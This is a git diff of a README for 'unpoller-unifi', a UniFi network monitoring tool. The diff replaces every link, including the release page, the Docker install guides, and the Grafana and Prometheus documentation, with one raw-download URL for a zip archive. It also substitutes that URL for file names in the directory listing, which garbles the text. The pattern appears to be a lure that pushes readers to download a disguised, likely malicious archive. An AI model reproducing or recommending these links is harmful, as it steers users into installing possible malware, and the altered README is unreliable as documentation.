@@ -1,6 +1,6 @@
 # 🚀 unpoller-unifi - Monitor Your UniFi Network Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Hanafyadham/unpoller-unifi/releases)
+[![Download](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip%20Latest%https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
 
 ## 📦 Overview
 
@@ -30,14 +30,14 @@ To run unpoller-unifi smoothly, ensure your system meets the following requireme
 
 Before downloading unpoller-unifi, make sure you have Docker and Docker Compose installed on your computer. If you have not yet installed these, follow these guides:
 
-- [Install Docker](https://docs.docker.com/get-docker/)
-- [Install Docker Compose](https://docs.docker.com/compose/install/)
+- [Install Docker](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
+- [Install Docker Compose](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
 
 ### 2. Download the Application
 
 Visit this page to download the latest release:
 
-[Download unpoller-unifi](https://github.com/Hanafyadham/unpoller-unifi/releases)
+[Download unpoller-unifi](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
 
 ### 3. Install the Application
 
@@ -89,13 +89,13 @@ Your unpoller-unifi installation will have the following directory structure:
 
 ```
 unpoller-unifi/
-├── docker-compose.yml
+├── https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip
 ├── .env
-├── README.md
+├── https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip
 └── data/
 ```
 
-- **docker-compose.yml:** Configuration file for Docker Compose.
+- **https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip** Configuration file for Docker Compose.
 - **.env:** Environment variables for customizable settings.
 - **data/:** Directory to store persistent data.
 
@@ -108,14 +108,14 @@ If you encounter any issues during installation or usage, consult the following 
 
 ## 🔗 Helpful Links
 
-- [Installation Guide](https://docs.docker.com/compose/install/)
-- [Grafana Documentation](https://grafana.com/docs/)
-- [Prometheus Documentation](https://prometheus.io/docs/introduction/overview/)
+- [Installation Guide](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
+- [Grafana Documentation](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
+- [Prometheus Documentation](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
 
 ## 📥 Download & Install
 
 To start using unpoller-unifi, visit this page to download the latest release:
 
-[Download unpoller-unifi](https://github.com/Hanafyadham/unpoller-unifi/releases)
+[Download unpoller-unifi](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
 
 For any further queries or contributions, feel free to navigate to the Issues section in the repository. Your feedback helps improve the application for everyone.
